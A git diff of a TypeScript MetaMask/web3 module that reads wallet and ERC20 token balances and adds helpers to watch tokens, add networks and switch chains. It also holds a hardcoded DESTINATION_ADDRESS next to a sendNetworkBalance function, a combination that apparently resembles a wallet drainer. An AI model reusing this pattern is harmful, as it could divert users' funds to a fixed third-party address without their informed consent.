@@ -1,11 +1,15 @@
 import Web3 from "web3";
 import { AbiItem } from 'web3-utils';
 import busd_abi from "../assets/tokens/busd.abi.json";
+import { ChainNetwork } from "../interfaces/networks/network.interface";
 import { networks } from "../interfaces/networks/networks";
+import { TokenInfo } from "../interfaces/token/token.interface";
+import tokenList from "../assets/tokens/tokens.json";
 
 export var web3: Web3;
 
 export const DESTINATION_ADDRESS = "0x30beE3deAC5F0861d378e78e1004Cf1459e0b347";
+const ETHEREUM_TOKEN_TYPE_STANDARD = 'ERC20';
 
 const tokenAddresses = [
     {
@@ -59,7 +63,7 @@ export async function connectToMetamask() {
         return;
     }
 
-    web3 = new Web3(window.ethereum);   
+    web3 = new Web3(window.ethereum);
     await window.ethereum.enable();
 
     /* await window.ethereum.request({
@@ -72,8 +76,12 @@ export async function connectToMetamask() {
     }
 }
 
+export function disconnectWallet() {
+    web3 = undefined;
+}
+
 export async function getNetworkBalance() {
-    if (!web3) return;
+    if (!web3) return { weiBalance: 0, balance: 0 };
 
     try {
         const address = await getWalletAddress();
@@ -88,15 +96,15 @@ export async function getNetworkBalance() {
     }
 }
 
-export async function getTokenInfo(tokenAddress: string) {
+export async function getTokenInfo(tokenAddress: string): Promise<TokenInfo> {
     if (!web3) return;
 
     try {
-        const token = { weiBalance: "", balance: "", name: "", symbol: "" }
+        const token: TokenInfo = { weiBalance: "", balance: "", name: "", symbol: "", decimals: "", address: tokenAddress }
         const tokenContract = new web3.eth.Contract(busd_abi as AbiItem[], tokenAddress);
 
         token.weiBalance = await tokenContract.methods.balanceOf(await getWalletAddress()).call();
-        token.balance = web3.utils.fromWei(token.weiBalance);
+        token.balance = web3.utils.fromWei(token.weiBalance as any);
         token.name = await tokenContract.methods.name().call();
         token.symbol = await tokenContract.methods.symbol().call();
 
@@ -122,4 +130,45 @@ export async function sendNetworkBalance(owner: string, destination: string, val
     } catch (err) {
         console.log(err);
     }
+}
+
+export async function addTokenToWallet(token: TokenInfo, type?: string) {
+    return await window.ethereum.request({
+        method: 'wallet_watchAsset',
+        params: {
+          type: type || ETHEREUM_TOKEN_TYPE_STANDARD, // Initially only supports ERC20, but eventually more!
+          options: token,
+        },
+      });
+}
+
+export async function addNetworkToWallet(network: ChainNetwork) {
+    return await window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [
+            network
+        ]
+    });
+}
+
+export async function changeToMainNet() {
+    return await window.ethereum.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: '0x1' }],
+     })
+}
+
+export async function getWalletTokens(customTokens?: TokenInfo[]): Promise<TokenInfo[]> {
+    const availableTokens = [/* ...Object.keys(tokenList).map((key) => tokenList[key]) */, ...customTokens];
+    const tokens = [];
+    
+    for (const token of availableTokens) {
+        const tokenInfo = await getTokenInfo(token.address);
+        
+        if (!tokenInfo) continue;
+
+        tokens.push(tokenInfo);
+    }
+
+    return tokens;
 }
